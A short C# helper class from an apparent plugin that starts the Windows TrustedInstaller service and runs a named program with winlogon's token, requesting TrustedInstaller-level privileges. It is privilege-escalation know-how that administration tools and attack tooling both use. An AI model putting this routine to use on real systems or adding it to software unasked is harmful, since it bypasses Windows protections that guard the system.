using System;

namespace Plugin.Helper;

internal class StartAsTrushInstaller
{
	private static bool StartTiService()
	{
		try
		{
			Win32.TryStartService("TrustedInstaller");
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void Start(string Name)
	{
		if (StartTiService())
		{
			SuperCore.RunWithTokenOf("winlogon.exe", OfActiveSessionOnly: true, Name, " /WithTokenOf:TrustedInstaller.exe");
		}
	}
}
